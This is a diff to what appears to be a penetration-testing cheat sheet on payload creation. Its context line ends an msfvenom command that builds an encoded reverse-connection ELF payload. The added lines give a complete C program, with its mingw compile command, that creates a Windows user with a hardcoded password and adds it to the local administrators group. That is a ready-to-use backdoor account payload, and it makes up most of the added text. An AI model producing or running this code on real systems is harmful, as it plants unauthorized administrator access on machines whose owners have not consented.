@@ -98,4 +98,31 @@ LHOST=<IP> LPORT=1337 -e x64/xor_dynamic -f elf > asuka.elf
 
 ### MSFvenom Payload Creator (MSFPC)
 
-[https://github.com/g0tmi1k/msfpc](https://github.com/g0tmi1k/msfpc)
+* [https://github.com/g0tmi1k/msfpc](https://github.com/g0tmi1k/msfpc)
+
+### Add Windows User
+
+**adduser.c**
+
+{% code overflow="wrap" %}
+```c
+#include <stdlib.h>
+
+int main ()
+{
+	int i;
+	i = system ("net user admoon Linuxsec#1337 /add");
+	i = system ("net localgroup administrators admoon /add");
+
+		return 0;
+}
+```
+{% endcode %}
+
+Compile:
+
+{% code overflow="wrap" %}
+```powershell
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+{% endcode %}
